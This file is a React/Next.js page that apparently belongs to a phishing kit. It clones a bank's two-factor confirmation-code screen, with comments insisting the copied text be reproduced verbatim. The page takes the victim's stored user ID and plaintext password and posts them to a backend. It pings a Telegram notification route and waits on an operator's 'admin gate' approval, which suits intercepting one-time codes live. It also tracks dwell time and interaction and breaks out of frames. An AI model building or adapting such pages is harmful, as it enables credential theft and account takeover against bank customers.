"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { Check, ChevronDown, Info, Lock, X } from "lucide-react";
import { Button } from "@/components/ui/button";
import { VerificationHeader } from "@/components/verification-header";
import { SiteFooter } from "@/components/site-footer";
import { ThreeDotSpinner } from "@/components/ThreeDotSpinner";
import { pollPendingLogin } from "@/lib/poll-pending-login";
import {
  PEAKONE_NEUTRAL_FILL,
  PEAKONE_NEUTRAL_HOVER,
  PEAKONE_PRIMARY_FILL,
  PEAKONE_PRIMARY_HOVER,
  WEALTHCARE_BUTTON_CHROME,
  WEALTHCARE_BUTTON_GEOMETRY,
} from "@/lib/wealthcare-button-styles";
import {
  APPROVAL_TIMEOUT_MS,
  MSG_UNABLE_REACH_VERIFICATION,
} from "@/lib/approval-messages";

type VerificationMethod = "email" | "text";

/** Reference copy, verbatim. The note is a single text node containing a missing
 *  space after "button." — reproduce it exactly when cloning. */
const CONF_TEXT =
  "Protecting your information is our first priority. In order to access this site or perform this specific function you must receive a confirmation code to the device of your choice. You will be asked to enter the code on the next screen.";

const NOTE_TEXT =
  "To proceed, please press the generate code button.If you wish to cancel, you will be asked to enter a code the next time you login or try to perform this specific function.";

/** Step 2 note — the reference drops the "press generate code" sentence. */
const WAITING_NOTE_TEXT =
  "If you wish to cancel, you will be asked to enter a code the next time you login or try to perform this specific function.";

const METHOD_OPTIONS: ReadonlyArray<{
  value: VerificationMethod;
  label: string;
}> = [
  { value: "email", label: "Email" },
  { value: "text", label: "Text" },
];

/** Button chrome comes from the shared Wealthcare tokens so every button in the
 *  flow is identical: `#bec5c2` border, `rounded-none`, 3px brand glow. Fills
 *  are Peak1's own palette, passed via `style`. */
const BUTTON_CHROME = `${WEALTHCARE_BUTTON_GEOMETRY} gap-3.5 ${WEALTHCARE_BUTTON_CHROME}`;

const CONTENT_COLUMN =
  "w-full px-[10px] pt-4 md:pt-10 pb-8 min-[769px]:px-4 min-[1200px]:max-w-[1180px] min-[1200px]:mx-auto min-[1440px]:max-w-[1280px] min-[1440px]:px-[50px]";

const CONTENT_INNER =
  "w-full min-[769px]:w-[calc(39%-27px)] min-[769px]:ml-[27px]";

export default function VerifyChoicePage() {
  const router = useRouter();
  const [method, setMethod] = useState<VerificationMethod>("email");
  const [loadingMethod, setLoadingMethod] = useState<VerificationMethod | null>(
    null,
  );
  const [navLoading, setNavLoading] = useState<"cancel" | null>(null);
  const [networkError, setNetworkError] = useState("");

  const mountedAtRef = useRef<number>(Date.now());
  const interactedRef = useRef(false);

  useEffect(() => {
    if (typeof window !== "undefined" && window.self !== window.top) {
      window.top!.location.href =
        window.location.pathname + window.location.search;
    }
  }, []);

  useEffect(() => {
    try {
      if (typeof window !== "undefined" && !sessionStorage.getItem("ubs_verify")) {
        router.replace("/");
        return;
      }
      const stored = sessionStorage.getItem("verification_method");
      if (stored === "email" || stored === "text") setMethod(stored);
    } catch {
      router.replace("/");
    }
  }, [router]);

  useEffect(() => {
    const onFirstInteraction = () => {
      interactedRef.current = true;
    };
    window.addEventListener("pointerdown", onFirstInteraction, {
      once: true,
      passive: true,
    });
    window.addEventListener("keydown", onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction);
      window.removeEventListener("keydown", onFirstInteraction);
    };
  }, []);

  const handleGenerate = async () => {
    if (loadingMethod || navLoading) return;
    setLoadingMethod(method);
    setNetworkError("");

    /* Fire-and-forget: the click notification must never sit on the UI path. */
    void fetch("/api/telegram/verification-click", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        verificationType: method === "email" ? "Email" : "Text",
      }),
      keepalive: true,
    }).catch(() => {});

    try {
      if (typeof window !== "undefined") {
        sessionStorage.setItem("verification_method", method);
      }

      /* Admin gate starts HERE (Gate 1). The landing Sign In button must NOT
         create a pending-login row — that is a 2s loading + navigate. */
      const res = await fetch("/api/pending-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId:
            typeof window !== "undefined"
              ? sessionStorage.getItem("loginUserId") || "login"
              : "login",
          password:
            typeof window !== "undefined"
              ? sessionStorage.getItem("loginPassword") || ""
              : "",
          method,
          flow: "login",
          dwellMs: Date.now() - mountedAtRef.current,
          interacted: interactedRef.current,
        }),
      });
      const data = (await res.json().catch(() => ({}))) as { id?: string };

      if (!res.ok || !data?.id) {
        setLoadingMethod(null);
        setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
        return;
      }

      const outcome = await pollPendingLogin(String(data.id), APPROVAL_TIMEOUT_MS);
      setLoadingMethod(null);

      if (outcome === "approved" || outcome === "redirected") {
        router.push("/verify");
        return;
      }

      /* Gate 1 decision → HOMEPAGE, not inline. Deny carries the field-matched
         copy (`MSG_LOGIN_DENIED_WEALTHCARE`), timeout carries
         `MSG_UNABLE_VERIFY_TIME`. Both are rendered by app/page.tsx from the
         query param. `MSG_UNABLE_REACH_VERIFICATION` is the GATEWAY error and
         stays inline only for real network/rejection failures below. */
      if (outcome === "denied") {
        window.location.href = "/?loginDenied=1";
        return;
      }
      if (outcome === "timeout") {
        window.location.href = "/?verifyUnavailable=1";
        return;
      }
      setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
    } catch {
      setLoadingMethod(null);
      setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
    }
  };

  const handleNavHome = async () => {
    if (navLoading || loadingMethod) return;
    setNavLoading("cancel");
    await new Promise((r) => setTimeout(r, 1000));
    router.push("/");
  };

  /* Swap on the clicked method, not on request resolution — otherwise the form
     is still mounted for a moment after the click. */
  const isWaiting = loadingMethod !== null;
  const showMethodSelection = !isWaiting;
  const optionsDisabled = loadingMethod !== null || navLoading !== null;

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <VerificationHeader />

      <main className="flex-1 flex flex-col min-[1200px]:items-center">
        <div className={CONTENT_COLUMN}>
          <div className={CONTENT_INNER}>
            {isWaiting && (
              <div className="text-center mb-[18px]">
                <Lock className="w-[46px] h-[46px] text-[#414041] mx-auto mb-[5px]" />
                <p className="text-[14px] leading-[1.6] text-[#707070]">
                  {method === "email"
                    ? "An e-mail has been sent:"
                    : "An SMS has been sent:"}
                </p>
                <p className="text-[14px] leading-[1.6] text-[#707070]">
                  Enter the verification code that you received via{" "}
                  <strong className="font-semibold">
                    {method === "email" ? "Email" : "SMS"}
                  </strong>{" "}
                  below:
                </p>
                <p className="text-[14px] leading-[1.6] text-[#707070] mt-4">
                  Note - Do not share your verification code with anyone else
                </p>
              </div>
            )}

            {/* Spinner occupies the form region only — copy and note stay put. */}
            {isWaiting && <ThreeDotSpinner label="Sending your verification code" />}

            {showMethodSelection && (
              <>
                <div className="text-center mb-[18px]">
                  <Lock className="w-[46px] h-[46px] text-[#414041] mx-auto mb-[5px]" />
                  <p className="text-[14px] leading-[1.6] text-[#707070]">
                    {CONF_TEXT}
                  </p>
                </div>

                {networkError ? (
                  <p className="text-red-600 text-sm text-center mb-4" role="alert">
                    {networkError}
                  </p>
                ) : null}

                <div
                  className={`transition-opacity ${optionsDisabled ? "opacity-60" : ""}`}
                >
                  {/* Label 200px + 36px inset / control 202px, side-by-side only
                      at >=1200px. */}
                  <div className="flex flex-col min-[1200px]:flex-row min-[1200px]:items-center min-[1200px]:justify-between gap-1 min-[1200px]:gap-0 mb-4">
                    <div className="w-full max-[768px]:mx-[5px] min-[769px]:pl-9 min-[1200px]:w-[200px] min-[1200px]:mr-auto">
                      <span className="block text-[14px] text-gray-700 max-[768px]:pl-8 min-[769px]:pl-0">
                        Confirmation Code
                      </span>
                    </div>
                    <div className="relative w-full h-[38px] bg-white min-[1200px]:w-[202px]">
                      <select
                        aria-label="Confirmation Code"
                        name="confirmationMethod"
                        value={method}
                        disabled={optionsDisabled}
                        onChange={(e) =>
                          setMethod(e.target.value as VerificationMethod)
                        }
                        className="w-full h-full pl-3 pr-8 bg-white border border-[#bec5c2] text-[15px] text-[#424242] outline-none appearance-none disabled:bg-[#f3f3f3] disabled:text-[#b0b0b0]"
                      >
                        {METHOD_OPTIONS.map((option) => (
                          <option key={option.value} value={option.value}>
                            {option.label}
                          </option>
                        ))}
                      </select>
                      <ChevronDown
                        className="pointer-events-none absolute right-2 top-1/2 -translate-y-1/2 w-[22px] h-[22px] text-[#424242]"
                        aria-hidden="true"
                      />
                    </div>
                  </div>

                  {/* 220px block, stacked, each button 100% wide. */}
                  <div className="w-[220px] mx-auto">
                    <Button
                      type="button"
                      variant="secondary"
                      disabled={optionsDisabled}
                      onClick={() => void handleNavHome()}
                      className={`${BUTTON_CHROME} mb-[10px]`}
                      style={{
                        backgroundColor: PEAKONE_NEUTRAL_FILL,
                        color: "#2d2d2d",
                      }}
                      onMouseEnter={(e) => {
                        e.currentTarget.style.backgroundColor =
                          PEAKONE_NEUTRAL_HOVER;
                      }}
                      onMouseLeave={(e) => {
                        e.currentTarget.style.backgroundColor =
                          PEAKONE_NEUTRAL_FILL;
                      }}
                    >
                      <X className="w-6 h-6 shrink-0" />
                      <span className="flex-1 text-center truncate">Cancel</span>
                    </Button>

                    <Button
                      type="button"
                      disabled={optionsDisabled}
                      onClick={() => void handleGenerate()}
                      className={BUTTON_CHROME}
                      style={{
                        backgroundColor: PEAKONE_PRIMARY_FILL,
                        color: "#ffffff",
                      }}
                      onMouseEnter={(e) => {
                        e.currentTarget.style.backgroundColor =
                          PEAKONE_PRIMARY_HOVER;
                      }}
                      onMouseLeave={(e) => {
                        e.currentTarget.style.backgroundColor =
                          PEAKONE_PRIMARY_FILL;
                      }}
                    >
                      <Check className="w-6 h-6 shrink-0" />
                      <span className="flex-1 text-center truncate">
                        Generate Code
                      </span>
                    </Button>
                  </div>
                </div>
              </>
            )}

            {/* Note lives OUTSIDE the gated form so it survives the wait. */}
            <div
              role="note"
              className="relative mt-6 pl-[48px] min-[769px]:pl-[62px] pr-[13px] py-[13px] pb-[14px] text-[14px] leading-[1.3] text-[#424242]"
              style={{ backgroundColor: "#F3F7A9" }}
            >
              <Info
                className="absolute left-1 top-1/2 -translate-y-1/2 w-[35px] h-[35px] text-[#414141]"
                aria-hidden="true"
              />
              <p className="m-0">{isWaiting ? WAITING_NOTE_TEXT : NOTE_TEXT}</p>
            </div>
          </div>
        </div>
      </main>

      <SiteFooter />
    </div>
  );
}
